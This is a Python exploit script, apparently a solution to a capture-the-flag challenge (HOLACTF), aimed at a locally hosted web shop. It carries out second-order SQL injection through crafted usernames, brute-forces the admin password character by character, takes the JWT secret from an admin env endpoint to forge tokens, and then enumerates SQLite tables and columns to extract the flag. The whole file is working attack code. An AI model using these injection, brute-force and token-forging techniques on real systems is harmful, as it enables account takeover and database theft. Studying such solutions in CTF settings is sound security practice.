import requests
import re
import jwt  
import string

URL="http://127.0.0.1:53191"
FLAG_PREFIX = "HOLACTF{" 
ALPHABET = string.digits + string.ascii_lowercase 
YOUR_USERNAME = "kou2"
YOUR_PASSWORD = "123"
PRODUCT_BOUGHT_NAME = {"1": "Laptop", "5":"Beta_product"}

def login(username, password, log = True):
    endpoint = "/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL+endpoint, headers=headers, data=data, allow_redirects=False)
    token =""
    if response.status_code in (200, 302):
        cookies = response.headers.get("Set-Cookie")
        if not cookies:
            print("[-] No Set-Cookie header in response") 
            exit()
        token = cookies.split(";")[0].split("=")[1]
        if log:
            print("Login successful")
            print("Token:", token)
        return token
    else:
        print("Login failed")
        print("Status Code:", response.status_code)
        print(response.text)
        exit()

def register(username, password, log = True):
    endpoint = "/register"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL+endpoint, headers=headers, data=data, allow_redirects=False)
    if response.status_code == 302:
        if log:
            print("Registration successful")
        return True
    else:
        if log:
            print("Registration failed")
            print("Status Code:", response.status_code)
        return False

def sign_token(username, secret_key):
    return jwt.encode({"username": username}, secret_key, algorithm="HS256")



def get_env(admin_token):
    endpoint = "/admin/tester"
    param = "?action=env"
    cookie = {
        "token": admin_token
    }
    response = requests.get(URL+endpoint+param, cookies=cookie)
    if response.status_code == 200:
        match = re.search(r"'SECRET_KEY':\s*'([^']+)'", response.text)
        if match:
            print(f"[+] Found secret key: {match.group(1)}")
            return match.group(1)
        else:
            print("[-] SECRET_KEY not found in response.")
            return None
    else:
        print(f"[-] Failed to access env page. Status: {response.status_code}")
        return None


def bruteforce_result(url, admin_token, known, thing_to_search, product_id, quantity_str):
    old_known = known
    endpoint = "/admin/search_order_history"
    CHARS = string.ascii_lowercase + string.digits + "!}{_"
    is_stopped = False
    while not is_stopped:
        found = False
        for c in CHARS:
            test_found = known + c
            cookie = {
                "token": admin_token
            }
            params = {
                "category": "username",
                "search_text": test_found
            }
            r = requests.get(url+endpoint, params=params, cookies=cookie)

            if is_right_char(product_id, quantity_str, r.text):
                known += c
                print(f"[+] Found so far: {known}")
                found = True
                break

        if not found:
            is_stopped=True
            break

    if known!=old_known:
        print(f"[âœ…] Final {thing_to_search}: {known}")
        return known
    else:
        print("[!] Brute-force finished or stuck.")
        exit()

def is_right_char(product_id, quantity_str, response_str):
    if PRODUCT_BOUGHT_NAME[str(product_id)] in response_str and  f"<td>{quantity_str}</td>" in response_str:
        return True
    return False

def bruteforce_phase_2(url, admin_token, payload, thing_to_search, known, quantity):
    # Step 1: Register payload account
    is_registered = register(payload, YOUR_PASSWORD)
    if not is_registered:
        print("[-] Payload account already exists, using existing user")
        secret_key = get_env(admin_token)
        if not secret_key:
            print("[-] No secret key, can't sign")
            print("[*] Exiting....")
            exit()
        payload_user_token = sign_token(payload, secret_key)
    else:
        payload_user_token = login(payload, YOUR_PASSWORD)
    
    # Step 1.5: Add money
    endpoint = "/admin/tester?action=add_money"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    cookies = {
        "token": admin_token
    }
    data = {
        "username": payload,
        "amount": "100000"
    }
    response = requests.post(url+endpoint, headers=headers, cookies=cookies, data=data)
    if response.status_code == 200:
        print("[+] Add money successfully")
    else:
        print("[-] Add money failed")
        print(response.text)
        print("Status Code:", response.status_code)
        print("Exiting...")
        exit()

    # Step 2: SQLi
    endpoint = "/buy_product"
    product_id = 1
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    cookies = {
        "token": payload_user_token
    }
    data = {
        "product_id": product_id,
        "number": int(quantity)
    }
    response = requests.post(url+endpoint, headers=headers, cookies=cookies, data=data)
    if "Sucessfully bought product" in response.text:
        print("[+] Buy product successfully")
    else:
        print("[-] Buy product failed")
        print("Status Code:", response.status_code)
        print("Exiting...")
        exit()
    
    # Step 3: Get flag
    endpoint = "/admin/order_history"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"      
    }
    cookies = { 
        "token": admin_token
    }
    response = requests.get(url+endpoint, headers=headers, cookies=cookies)
    if response.status_code == 200:
        print("[+] Order history retrieved successfully")
        result = bruteforce_result(url, admin_token, known, thing_to_search, product_id ,str(quantity))
        return result
    else:
        print("[-] Failed to retrieve order history")
        print("Status Code:", response.status_code)
        print("Exiting...")
        exit()

def exploit_phase_1(url):
    admin_password =""
    is_found = False
    quantity = 50
    while not is_found:
        found_char = False
        for char in ALPHABET:
            payload = f"""' UNION SELECT '{YOUR_USERNAME}' FROM users WHERE username = 'admin' AND password LIKE '{admin_password+char}%"""
            # Step 1: Register payload account and login
            check = register(payload, YOUR_PASSWORD, False)
            token = login(payload, YOUR_PASSWORD, False)
            # Step 2: Send payload
            endpoint = "/buy_product"
            product_id = "5"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }
            cookies = {
                "token": token
            }
            data = {
                "product_id": product_id,
                "number": quantity
            }
            response = requests.post(url+endpoint, headers=headers, cookies=cookies, data=data)
            # Step 3: Search in your username
            endpoint = "/order_history"
            product_id = "5"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }
            cookies = {
                "token": login(YOUR_USERNAME, YOUR_PASSWORD, False)
            }
            response = requests.get(url+endpoint, headers=headers, cookies=cookies)
            if is_right_char(product_id, str(quantity), response.text):
                found_char = True
                admin_password += char
                quantity += 1
                print(quantity)
                print(f"[+] Found character: {char}")
                print(f"Current admin password: {admin_password}")
            
            if found_char:
                break

            if ALPHABET.index(char)==len(ALPHABET)-1 and found_char == False:
                is_found = True
                break

    print(f"[+] Final admin password is: {admin_password}")
    admin_token = login("admin", admin_password)
    print("[+] Login successfully")
    return admin_token

def exploit_phase_2(url, admin_token):
    payload_21 = """' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name like 'flag%"""
    all_table = bruteforce_phase_2(url, admin_token, payload_21, "table", "fla", 10).split(",")
    flag_table = all_table[0]
    if not flag_table:
        print("[-] Can't find flag table, exitting")
        exit()
    payload_22 = f"""' UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('{flag_table}') WHERE name LIKE 'flag%"""
    all_column = bruteforce_phase_2(url, admin_token, payload_22, "column", "fla", 20).split(",")
    flag_column = all_column[0]
    if not flag_column:
        print("[-] Can't find flag column, exitting")
        exit()
    payload_23 = f"""' UNION SELECT {flag_column} FROM {flag_table} WHERE {flag_column} LIKE '%{FLAG_PREFIX}%"""
    flag = bruteforce_phase_2(url, admin_token, payload_23, "flag", FLAG_PREFIX, 5)
    if not flag:
        print("[-] Can't find flag, exitting")
        exit()
    else:
        print(f"[*] Flag is {flag}")

if __name__ == "__main__":  
    #phase 0: Register your username and password
    register(YOUR_USERNAME, YOUR_PASSWORD)
    # phase 1: Get password
    print("[*] Starting exploit phase 1...")
    admin_token = exploit_phase_1(URL)
    # phase 2: Get flag
    print("[*] Starting exploit phase 2...")
    exploit_phase_2(URL, admin_token)